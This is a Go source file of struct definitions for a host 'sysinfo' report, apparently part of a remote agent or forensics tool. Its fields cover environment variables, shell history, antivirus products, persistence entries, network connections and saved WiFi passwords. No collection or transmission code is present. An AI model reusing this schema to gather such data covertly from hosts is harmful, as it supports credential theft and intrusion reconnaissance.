package sysinfo

// ResourceUsage contains all system resource information
type ResourceUsage struct {
	CPUUsage  float64 `json:"cpu_usage" msgpack:"cpu_usage"`
	RAMUsage  float64 `json:"ram_usage" msgpack:"ram_usage"`
	RAMUsed   string  `json:"ram_used" msgpack:"ram_used"`
	RAMTotal  string  `json:"ram_total" msgpack:"ram_total"`
	DiskUsage float64 `json:"disk_usage" msgpack:"disk_usage"`
	DiskUsed  string  `json:"disk_used" msgpack:"disk_used"`
	DiskTotal string  `json:"disk_total" msgpack:"disk_total"`
	Uptime    string  `json:"uptime" msgpack:"uptime"`

	// Extended info (cross-platform)
	NetworkConnections []NetworkConnectionInfo `json:"network_connections" msgpack:"network_connections"`
	AllDrives          []DriveInfo             `json:"all_drives" msgpack:"all_drives"`
	EnvVars            map[string]string       `json:"env_vars" msgpack:"env_vars"`
	LoggedInUsers      []string                `json:"logged_in_users" msgpack:"logged_in_users"`
	Hostname           string                  `json:"hostname" msgpack:"hostname"`
	OSInfo             string                  `json:"os_info" msgpack:"os_info"`
	Arch               string                  `json:"arch" msgpack:"arch"`
	KernelVersion      string                  `json:"kernel_version" msgpack:"kernel_version"`

	// Windows-specific
	ScheduledTasks      []ScheduledTaskInfo       `json:"scheduled_tasks,omitempty" msgpack:"scheduled_tasks"`
	RegistryPersistence []RegistryPersistenceInfo `json:"registry_persistence,omitempty" msgpack:"registry_persistence"`
	RunningServices     []ServiceInfo             `json:"running_services,omitempty" msgpack:"running_services"`
	StartupPrograms     []StartupProgramInfo      `json:"startup_programs,omitempty" msgpack:"startup_programs"`
	AntivirusProducts   []string                  `json:"antivirus_products,omitempty" msgpack:"antivirus_products"`

	// Linux-specific
	CronJobs      []CronJobInfo `json:"cron_jobs,omitempty" msgpack:"cron_jobs"`
	SystemdUnits  []UnitInfo    `json:"systemd_units,omitempty" msgpack:"systemd_units"`
	InstalledPkgs []string      `json:"installed_packages,omitempty" msgpack:"installed_packages"`

	// macOS-specific
	LaunchAgents  []LaunchItemInfo `json:"launch_agents,omitempty" msgpack:"launch_agents"`
	LaunchDaemons []LaunchItemInfo `json:"launch_daemons,omitempty" msgpack:"launch_daemons"`

	// WiFi credentials (cross-platform)
	WiFiProfiles []WiFiProfileInfo `json:"wifi_profiles,omitempty" msgpack:"wifi_profiles"`

	// Network info
	LocalIP        string   `json:"local_ip,omitempty" msgpack:"local_ip"`
	DefaultGateway string   `json:"default_gateway,omitempty" msgpack:"default_gateway"`
	DNSServers     []string `json:"dns_servers,omitempty" msgpack:"dns_servers"`

	// Mapped drives (Windows)
	MappedDrives []MappedDriveInfo `json:"mapped_drives,omitempty" msgpack:"mapped_drives"`

	// Shell/PS history (cross-platform)
	PSHistory string `json:"ps_history,omitempty" msgpack:"ps_history"`
}

// NetworkConnectionInfo represents an active network connection.
type NetworkConnectionInfo struct {
	Protocol    string `json:"protocol" msgpack:"protocol"`
	LocalAddr   string `json:"local_addr" msgpack:"local_addr"`
	RemoteAddr  string `json:"remote_addr" msgpack:"remote_addr"`
	State       string `json:"state" msgpack:"state"`
	PID         uint32 `json:"pid" msgpack:"pid"`
	ProcessName string `json:"process_name" msgpack:"process_name"`
}

// DriveInfo represents a drive/mount's usage.
type DriveInfo struct {
	Mount string  `json:"mount" msgpack:"mount"`
	Label string  `json:"label" msgpack:"label"`
	Type  string  `json:"type" msgpack:"type"`
	Usage float64 `json:"usage" msgpack:"usage"`
	Used  string  `json:"used" msgpack:"used"`
	Total string  `json:"total" msgpack:"total"`
	FS    string  `json:"fs" msgpack:"fs"`
}

// ScheduledTaskInfo represents a non-Microsoft scheduled task (Windows).
type ScheduledTaskInfo struct {
	Name    string `json:"name" msgpack:"name"`
	Path    string `json:"path" msgpack:"path"`
	State   string `json:"state" msgpack:"state"`
	NextRun string `json:"next_run" msgpack:"next_run"`
	Author  string `json:"author" msgpack:"author"`
	Command string `json:"command" msgpack:"command"`
}

// RegistryPersistenceInfo represents a registry-based persistence entry (Windows).
type RegistryPersistenceInfo struct {
	Key   string `json:"key" msgpack:"key"`
	Name  string `json:"name" msgpack:"name"`
	Value string `json:"value" msgpack:"value"`
	Type  string `json:"type" msgpack:"type"`
}

// ServiceInfo represents a running Windows service.
type ServiceInfo struct {
	Name        string `json:"name" msgpack:"name"`
	DisplayName string `json:"display_name" msgpack:"display_name"`
	State       string `json:"state" msgpack:"state"`
	StartMode   string `json:"start_mode" msgpack:"start_mode"`
	PathName    string `json:"path_name" msgpack:"path_name"`
}

// StartupProgramInfo represents a startup program entry (Windows).
type StartupProgramInfo struct {
	Name     string `json:"name" msgpack:"name"`
	Path     string `json:"path" msgpack:"path"`
	Location string `json:"location" msgpack:"location"`
}

// CronJobInfo represents a cron job entry (Linux/macOS).
type CronJobInfo struct {
	User     string `json:"user" msgpack:"user"`
	Command  string `json:"command" msgpack:"command"`
	Schedule string `json:"schedule" msgpack:"schedule"`
	File     string `json:"file" msgpack:"file"`
}

// UnitInfo represents a systemd unit (Linux).
type UnitInfo struct {
	Name        string `json:"name" msgpack:"name"`
	Description string `json:"description" msgpack:"description"`
	LoadState   string `json:"load_state" msgpack:"load_state"`
	ActiveState string `json:"active_state" msgpack:"active_state"`
	SubState    string `json:"sub_state" msgpack:"sub_state"`
}

// LaunchItemInfo represents a launchd agent/daemon (macOS).
type LaunchItemInfo struct {
	Label     string `json:"label" msgpack:"label"`
	Program   string `json:"program" msgpack:"program"`
	RunAtLoad bool   `json:"run_at_load" msgpack:"run_at_load"`
	KeepAlive bool   `json:"keep_alive" msgpack:"keep_alive"`
	Disabled  bool   `json:"disabled" msgpack:"disabled"`
	Location  string `json:"location" msgpack:"location"`
}

// MappedDriveInfo represents a mapped network drive (Windows).
type MappedDriveInfo struct {
	Letter string `json:"letter" msgpack:"letter"`
	Path   string `json:"path" msgpack:"path"`
	Status string `json:"status" msgpack:"status"`
}

// WiFiProfileInfo represents a saved WiFi network with credentials.
type WiFiProfileInfo struct {
	SSID     string `json:"ssid" msgpack:"ssid"`
	Password string `json:"password" msgpack:"password"`
	Security string `json:"security" msgpack:"security"`
}
